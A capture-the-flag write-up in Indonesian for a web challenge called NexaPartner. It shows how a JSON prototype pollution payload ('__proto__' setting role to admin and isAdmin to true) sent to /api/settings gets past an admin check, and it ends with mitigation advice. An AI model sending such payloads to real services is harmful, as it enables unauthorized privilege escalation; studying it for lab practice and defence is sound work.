# NexaPartner

**Category:** Web  

## 1. Reconnaissance

Pertama, aku buka website NexaPartner dan coba lihat fitur yg tersedia. Dari halaman login, ternyata disediakan akun demo yg bisa dipake buat masuk ke dashboard.

Kredensial yg digunakan:

```text
Email    : partner@nexapartner.test
Password : partner1234
```

Setelah berhasil login, aku masuk ke dashboard sebagai user partner biasa. Dari sini aku mulai cek request API yg digunakan website, terutama bagian settings.

## 2. Finding Vulnerability

Setelah melihat endpoint yg tersedia, aku menemukan endpoint:

```http
POST /api/settings
```

Aku coba analisis bagaimana server memproses data JSON yg dikirim melalui endpoint tersebut.

Dari situ muncul dugaan adanya vulnerability Prototype Pollution, yaitu kondisi ketika aplikasi JavaScript memproses input object tanpa validasi yg cukup sehingga prototype object bisa dimanipulasi.

## 3. Exploitation

Aku coba mengirim payload berikut ke endpoint `/api/settings`:

```json
{
  "__proto__": {
    "role": "admin",
    "isAdmin": true
  }
}
```

Request tersebut berhasil diproses dan server memberikan response `200 OK`.

Payload ini mencoba memanipulasi prototype agar properti `role` dan `isAdmin` memiliki nilai yg dibutuhkan untuk melewati pengecekan hak akses admin.

## 4. Admin Access

Setelah payload berhasil dikirim, aku mencoba mengakses halaman admin:

```http
GET /admin
```

Sebelum exploit, endpoint tersebut memberikan response:

```http
403 Forbidden
```

Namun, setelah payload Prototype Pollution dikirim, hasilnya berubah menjadi:

```http
302 Found
Location: /admin/audit
```

Artinya, pengecekan akses admin berhasil dilewati dan server mengarahkan request ke halaman audit.

Selanjutnya aku akses:

```http
GET /admin/audit
```

Hasilnya, halaman berhasil dibuka dengan response:

```http
200 OK
```

## 5. Getting the Flag

Di halaman `/admin/audit`, aku menemukan audit console yg menampilkan informasi administrator dan aktivitas recovery token.

Dari informasi tersebut, akhirnya flag berhasil ditemukan.

## 6. Flag

```text
NFX{js0n_pr0t0_p0llut10n_4dm1n_byp4ss}
```

![exploit](images/hasil.png)

## 7. Conclusion

Dari challenge ini, vulnerability Prototype Pollution pada pemrosesan JSON bisa dimanfaatkan untuk memanipulasi properti object yg digunakan dalam pengecekan authorization.

Karena aplikasi tidak melakukan validasi input dengan benar, user biasa bisa memanipulasi properti `role` dan `isAdmin`, sehingga berhasil mendapatkan akses ke halaman admin.

**Solusi:** Lakukan validasi terhadap input JSON, hindari penggunaan object yg tidak aman, dan jangan menjadikan properti dari prototype sebagai dasar pengecekan authorization. Hak akses sebaiknya diverifikasi berdasarkan data user yg tersimpan dan terpercaya di server.
